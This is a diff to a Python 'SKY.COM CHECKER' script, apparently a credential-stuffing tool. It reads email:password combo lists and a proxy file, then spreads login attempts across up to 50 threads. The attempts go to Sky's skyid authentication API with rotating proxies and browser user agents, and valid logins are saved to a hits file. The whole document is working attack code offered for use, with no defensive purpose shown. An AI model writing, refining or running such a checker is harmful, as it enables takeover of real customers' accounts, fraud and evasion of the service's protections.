@@ -15,7 +15,6 @@ os.system('cls' if os.name == 'nt' else 'clear')
 
 print(f"{Fore.CYAN}{'SKY.COM CHECKER'.center(columns)}")
 print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
-print(f"{Fore.GREEN}{'[Full Proxy Support - Fixed Version]'.center(columns)}")
 
 combo_file = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip() or "combo.txt"
 
@@ -34,8 +33,8 @@ def load_proxies():
 combos = load_combos(combo_file)
 proxies = load_proxies()
 
-if not combos: input(f"\n{Fore.RED}No combos. Press Enter..."); exit()
-if not proxies: input(f"\n{Fore.RED}No proxies. Press Enter..."); exit()
+if not combos: input(f"{Fore.RED}No combos. Press Enter..."); exit()
+if not proxies: input(f"{Fore.RED}No proxies. Press Enter..."); exit()
 
 threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
 threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))
@@ -47,33 +46,33 @@ lock = threading.Lock()
 start_time = time.time()
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
 ]
 
 def format_proxy(p):
     try:
         p = p.strip()
         if not p: return None
-        proxy_type = "http"
+        ptype = "http"
         if "://" in p:
             proto = p.split("://")[0].lower()
-            if proto in ["socks5", "socks5h"]: proxy_type = "socks5h"
-            elif proto == "socks4": proxy_type = "socks4"
             p = p.split("://", 1)[1]
+            if proto in ["socks5", "socks5h"]: ptype = "socks5h"
+            elif proto == "socks4": ptype = "socks4"
         if "@" in p:
-            auth, host = p.rsplit("@", 1)
-            if ":" in host:
-                h, po = host.rsplit(":", 1)
-                if ":" in auth:
-                    u, pw = auth.split(":", 1)
-                    return {"http": f"{proxy_type}://{u}:{pw}@{h}:{po}", "https": f"{proxy_type}://{u}:{pw}@{h}:{po}"}
-        parts = p.split(":")
-        if len(parts) == 2:
-            return {"http": f"{proxy_type}://{parts[0]}:{parts[1]}", "https": f"{proxy_type}://{parts[0]}:{parts[1]}"}
-        elif len(parts) == 4:
-            return {"http": f"{proxy_type}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}", "https": f"{proxy_type}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
-        return None
+            auth, hp = p.rsplit("@", 1)
+            h, po = hp.split(":")
+            u, pw = auth.split(":", 1)
+            url = f"{ptype}://{u}:{pw}@{h}:{po}"
+        else:
+            parts = p.split(":")
+            if len(parts) == 4:
+                url = f"{ptype}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            elif len(parts) == 2:
+                url = f"{ptype}://{parts[0]}:{parts[1]}"
+            else: return None
+        return {"http": url, "https": url}
     except: return None
 
 def get_cpm():
@@ -91,19 +90,18 @@ def check_account(email, pwd, proxy_dict):
             "Accept-Language": "en-GB,en;q=0.9",
         }
         
-        # Get Sky ID login page
-        s.get("https://www.sky.com/signin", headers=headers, proxies=proxy_dict, timeout=10, verify=False)
+        # Get Sky signin page
+        s.get("https://www.sky.com/signin", headers=headers, proxies=proxy_dict, timeout=15, verify=False)
         
-        headers.update({
-            "Content-Type": "application/json",
-            "Accept": "application/json",
-            "Origin": "https://www.sky.com",
-            "Referer": "https://www.sky.com/signin",
-            "X-Requested-With": "XMLHttpRequest"
-        })
+        # Sky ID API login
+        headers["Content-Type"] = "application/json"
+        headers["Accept"] = "application/json"
+        headers["Origin"] = "https://www.sky.com"
+        headers["Referer"] = "https://www.sky.com/signin"
         
-        payload = {"username": email, "password": pwd, "rememberMe": True}
-        r = s.post("https://skyid.sky.com/api/authenticate", json=payload, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
+        r = s.post("https://skyid.sky.com/api/authenticate",
+                   json={"username": email, "password": pwd, "rememberMe": True},
+                   headers=headers, proxies=proxy_dict, timeout=15, verify=False)
         
         txt = r.text.lower()
         if r.status_code == 200 and any(x in txt for x in ["token", "success", "profile", "account", "session"]):
@@ -122,9 +120,11 @@ def worker(q):
         try: combo = q.get_nowait()
         except: break
         
-        email, pwd = combo.split(":", 1)
-        result, reason = "error", "No proxy"
+        parts = combo.split(":", 1)
+        if len(parts) != 2: q.task_done(); continue
+        email, pwd = parts
         
+        result, reason = "error", "No proxy"
         for _ in range(3):
             proxy_dict = format_proxy(random.choice(proxies))
             if proxy_dict:
@@ -149,13 +149,11 @@ def main():
     q = Queue()
     for c in combos: q.put(c)
     open("Sky_Hits.txt", "w").close()
-    
     for _ in range(threads_count):
         threading.Thread(target=worker, args=(q,), daemon=True).start()
-    
     q.join()
-    print(f"\n{Fore.CYAN}Finished! Hits: {hit_counter} | Failed: {fail_counter} | CPM: {get_cpm()}")
-    input("Press Enter to exit...")
+    print(f"\n{Fore.CYAN}Done! Hits: {hit_counter} | Failed: {fail_counter} | CPM: {get_cpm()}")
+    input("Press Enter...")
 
 if __name__ == "__main__":
     main()
